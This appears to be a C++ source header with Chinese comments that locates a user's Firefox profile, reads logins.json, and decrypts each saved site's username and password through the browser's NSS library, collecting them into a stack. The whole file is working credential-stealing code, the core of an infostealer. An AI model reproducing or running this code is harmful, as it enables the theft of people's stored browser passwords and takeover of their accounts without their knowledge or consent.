#pragma once
#include "getDll.h"
#include "formatChange.h"
#include <regex>
#include <stack>


/*
此文件用于对读入的加密信息进行解密
*/
//定义用户信息的数据结构
struct UserInfo {
	char* Host;
	char* Username;
	char* Password;
};

//声明用户信息存储的静态堆栈
static stack<UserInfo> UserStack;
	
//宏定义返回值
constexpr auto DECRYPT_FAIL = "decrypt fail";//解密失败
constexpr auto DECRYPT_SUCCESS = "decrypt success";//解密成功

//用于查询加密字符串中特定字符的个数，返回值为字符个数
/*
Firefox对密码进行了两次加密，内部函数加密和base64加密，
并且在加密后的字符串添加0-3个‘=’，此函数用于统计加入
的‘=’的数目。
*/
size_t char_count(const char* str, size_t size, const char ch) {
	size_t count = 0;
	for (size_t i = size - 1; i > size - 4; i--) {
		if (str[i] == ch)count++;
		else break;
	}
	return count;
}

//用于将输入的加密信息解密
unsigned char* decrypt(string encryptStr) {
	size_t szDecoded = encryptStr.size() / 4 * 3 - char_count(encryptStr.c_str(), encryptStr.size(), '=');//存储其原本的base64加密前的字符串长度
	char* chDecoded = (char*)malloc(szDecoded + 1);

	if (chDecoded != NULL) memset(chDecoded, NULL, szDecoded + 1);
	else return (unsigned char*)DECRYPT_FAIL;

	SECItem encrypted, decrypted;

	encrypted.data = (unsigned char*)malloc(szDecoded + 1);
	encrypted.len = szDecoded;
	if (encrypted.data != NULL)memset(encrypted.data, NULL, szDecoded + 1);
	else return (unsigned char*)DECRYPT_FAIL;

	decrypted.len = szDecoded;

	if (PL_Base64Decode(encryptStr.c_str(), encryptStr.size(), chDecoded)) {

		memcpy(encrypted.data, chDecoded, szDecoded);
		PK11SlotInfo* objSlot = PK11_GetInternalKeySlot();
		if (objSlot) {
			if (PK11_Authenticate(objSlot, TRUE, NULL) == SECSuccess) {
				SECStatus s = PK11SDR_Decrypt(&encrypted, &decrypted, nullptr);

			}
			else return (unsigned char*)DECRYPT_FAIL;

		}
		else return (unsigned char*)DECRYPT_FAIL;

		PK11_FreeSlot(objSlot);
	}

	//正确退出
	unsigned char* temp = (unsigned char*)malloc(decrypted.len + (INT64)1);
	if (temp != nullptr) {
		temp[decrypted.len] = NULL;
		memcpy(temp, decrypted.data, decrypted.len);
		return temp;
	}
	//错误退出
	return (unsigned char*)DECRYPT_FAIL;
}

//调用解密函数，输出解密后的结果
string loginInfoDecrypt() {
	if (loadFunc() == LOAD_FAIL) return DECRYPT_FAIL;

	string profilePath = findLoginInfo();
	if (profilePath == FIND_FAIL) return DECRYPT_FAIL;

	SECStatus s = NSS_Init(profilePath.c_str());
	if (s != SECSuccess) return DECRYPT_FAIL;

	//获取加密信息，以及定义筛选信息的正则表达式
	string loginStr = getLoginInfo(profilePath + "\\logins.json");
	regex re("\"hostname\":\"([^\"]+)\"");
	regex reUsername("\"encryptedUsername\":\"([^\"]+)\"");
	regex rePassword("\"encryptedPassword\":\"([^\"]+)\"");
	smatch match;
	string::const_iterator searchStart(loginStr.cbegin());
	UserInfo userInfoTemp;
	while (std::regex_search(searchStart, loginStr.cend(), match, re)) {
		userInfoTemp.Host = U2G(match.str(1).c_str());

		std::regex_search(searchStart, loginStr.cend(), match, reUsername);
		userInfoTemp.Username = U2G((const char*)decrypt(match.str(1)));

		std::regex_search(searchStart, loginStr.cend(), match, rePassword);
		userInfoTemp.Password = U2G((const char*)decrypt(match.str(1)));
		searchStart += match.position() + match.length();

		UserStack.push(userInfoTemp);
	}

	NSS_Shutdown();
	return DECRYPT_SUCCESS;
}

